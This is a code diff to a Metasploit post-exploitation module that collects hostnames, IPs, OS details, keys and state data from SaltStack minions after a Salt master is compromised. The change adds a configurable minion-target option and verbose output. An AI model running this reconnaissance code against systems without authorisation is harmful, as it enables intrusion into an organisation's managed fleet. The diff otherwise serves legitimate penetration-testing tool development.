@@ -24,6 +24,7 @@ class MetasploitModule < Msf::Post
     )
     register_options(
       [
+        OptString.new('MINIONS', [true, 'Minions Target', '*']),
         OptBool.new('GETHOSTNAME', [false, 'Gather Hostname from minions', true]),
         OptBool.new('GETIP', [false, 'Gather IP from minions', true]),
         OptBool.new('GETOS', [false, 'Gather OS from minions', true])
@@ -45,9 +46,11 @@ class MetasploitModule < Msf::Post
       command << 'status.version'
     end
     commas = ',' * (command.length - 1) # we need to provide empty arguments for each command
-    command = "salt '*' --output=yaml #{command.join(',')} '#{commas}'"
+    command = "salt '#{datastore['MINIONS']}' --output=yaml #{command.join(',')} #{commas}"
     begin
-      results = YAML.safe_load(cmd_exec(command))
+      out = cmd_exec(command)
+      vprint_status(out)
+      results = YAML.safe_load(out)
       store_path = store_loot('saltstack_minion_data_gather', 'application/x-yaml', session, results.to_yaml, 'minion_data_gather.yaml', 'SaltStack Minion Data Gather')
       print_good("#{peer} - minion data gathering successfully retrieved and saved on #{store_path}")
     rescue Psych::SyntaxError
@@ -82,7 +85,9 @@ class MetasploitModule < Msf::Post
       return
     end
     begin
-      minions = YAML.safe_load(cmd_exec('salt-key -L --output=yaml'))
+      out = cmd_exec('salt-key -L --output=yaml')
+      vprint_status(out)
+      minions = YAML.safe_load(out)
     rescue Psych::SyntaxError
       print_error('Unable to load salt-key -L data')
       return
@@ -138,7 +143,7 @@ class MetasploitModule < Msf::Post
       return
     end
     print_status('Show SLS XXX')
-    puts cmd_exec("salt '*' state.show_sls '*'")
+    puts cmd_exec("salt '#{datastore['MINIONS']}' state.show_sls '*'")
     # XXX do what with this info...
 
     # get roster
